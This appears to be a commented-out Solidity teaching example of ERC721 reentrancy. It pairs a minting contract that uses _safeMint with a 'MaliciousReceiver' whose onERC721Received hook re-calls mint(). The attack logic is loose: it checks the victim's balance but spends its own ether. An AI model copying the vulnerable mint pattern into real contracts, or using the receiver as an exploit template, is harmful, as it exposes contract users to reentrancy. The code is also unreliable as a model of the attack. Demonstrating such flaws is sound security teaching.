// // SPDX-License-Identifier: MIT
// pragma solidity ^0.8.0;

// import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

// contract VulnerableERC721 is ERC721 {
//     uint256 public nextTokenId;
//     uint256 public mintPrice = 0.01 ether;

//     constructor() ERC721("VulnerableNFT", "VNFT") {
//         nextTokenId = 1;
//     }

//     function mint() public payable {
//         require(msg.value == mintPrice, "Incorrect Ether value.");
//         _safeMint(msg.sender, nextTokenId++);
//     }
// }

// contract MaliciousReceiver {
//     VulnerableERC721 public nftContract;

//     constructor(address _nftContract) {
//         nftContract = VulnerableERC721(_nftContract);
//     }

//     function attack() public payable {
//         nftContract.mint{value: msg.value}();
//     }

//     function onERC721Received(address, address, uint256, bytes memory) public returns (bytes4) {
//         if (address(nftContract).balance >= nftContract.mintPrice()) {
//             nftContract.mint{value: nftContract.mintPrice()}();
//         }
//         return this.onERC721Received.selector;
//     }
// }
